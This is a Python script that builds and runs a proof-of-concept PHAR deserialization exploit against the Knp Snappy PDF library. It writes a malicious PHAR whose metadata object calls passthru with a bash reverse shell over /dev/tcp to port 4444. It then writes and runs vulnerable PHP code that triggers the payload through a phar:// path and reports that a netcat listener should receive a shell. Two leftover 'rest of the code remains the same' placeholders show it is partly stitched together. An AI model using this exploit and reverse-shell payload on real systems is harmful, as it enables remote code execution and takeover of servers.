import os
import shutil
import subprocess

# Function to delete a file or directory if it exists
def delete_if_exists(path):
    if os.path.exists(path):
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)

# Delete existing files and directories
delete_if_exists("generate_phar.php")
delete_if_exists("index.php")
delete_if_exists("poc.phar")
delete_if_exists("phar:")  # Remove the conflicting directory

# ... (rest of the code remains the same)


# ... (rest of the code remains the same)


# Generate malicious PHAR file with reverse shell payload
generate_phar_code = '''<?php
class VulnerableClass { }
$dummy = new VulnerableClass();
$dummy->callback = "passthru";
$dummy->fileName = "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1";  // Reverse shell payload

@unlink("poc.phar");
$poc = new Phar("poc.phar");
$poc->startBuffering();
$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
$poc["file"] = "text";
$poc->setMetadata($dummy);
$poc->stopBuffering();
'''

with open("generate_phar.php", "w") as f:
    f.write(generate_phar_code)

# Change ownership to www-data and set permissions
subprocess.run(["chown", "www-data:www-data", "generate_phar.php"])
subprocess.run(["chmod", "755", "generate_phar.php"])

# Run PHP script to generate malicious PHAR file
subprocess.run(["php", "--define", "phar.readonly=0", "generate_phar.php"])

# Simulate exploitation by running the vulnerable PHP code
vulnerable_code = '''<?php
require __DIR__ . '/vendor/autoload.php';
use Knp\\Snappy\\Pdf;

class VulnerableClass {
  public $fileName;
  public $callback;
  function __destruct() {
    call_user_func($this->callback, $this->fileName);
  }
}

$snappy = new Pdf('/usr/local/bin/wkhtmltopdf');
$snappy->generateFromHtml('<h1>Bill</h1><p>You owe me money, dude.</p>', 'phar://poc.phar');
'''

with open("index.php", "w") as f:
    f.write(vulnerable_code)

# Change ownership to www-data and set permissions
subprocess.run(["chown", "www-data:www-data", "index.php"])
subprocess.run(["chmod", "755", "index.php"])

# Run the vulnerable PHP code
subprocess.run(["php", "index.php"])

# Check if the exploit was successful
print("Exploit executed. Check your netcat listener for a reverse shell.")
